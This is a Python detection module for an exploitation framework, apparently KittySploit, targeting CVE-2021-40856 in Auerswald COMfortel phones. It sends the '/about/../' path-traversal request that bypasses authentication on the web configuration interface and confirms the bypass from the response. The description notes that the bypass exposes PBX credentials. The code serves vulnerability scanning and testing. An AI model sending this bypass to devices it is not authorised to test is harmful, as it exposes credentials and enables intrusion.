#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Auerswald COMfortel 1400/2600/3600 IP is susceptible to an authentication bypass vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Auerswald COMfortel 1400/2600/3600 IP - Authentication Bypass Detection',
        'description': 'Auerswald COMfortel 1400/2600/3600 IP is susceptible to an authentication bypass vulnerability. Inserting the prefix "/about/../" allows bypassing the authentication check for the web-based configuration management interface. This enables attackers to gain access to the login credentials used for authentication at the PBX, among other data.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'packetstorm', 'comfortel', 'auth-bypass', 'auerswald', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-40856',
            'https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-004/-auerswald-comfortel-1400-2600-3600-ip-authentication-bypass',
            'https://www.redteam-pentesting.de/en/advisories/-advisories-publicised-vulnerability-analyses',
            'http://packetstormsecurity.com/files/165162/Auerswald-COMfortel-1400-2600-3600-IP-2.8F-Authentication-Bypass.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-40856',
    }

    def run(self):
        path = '/about/../tree?action=get'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': '*/*'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"TYPE"', '"ITEMS"', '"COUNT"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Auerswald COMfortel 1400/2600/3600 IP - Authentication Bypass detected', path=path)
            return True
        return False

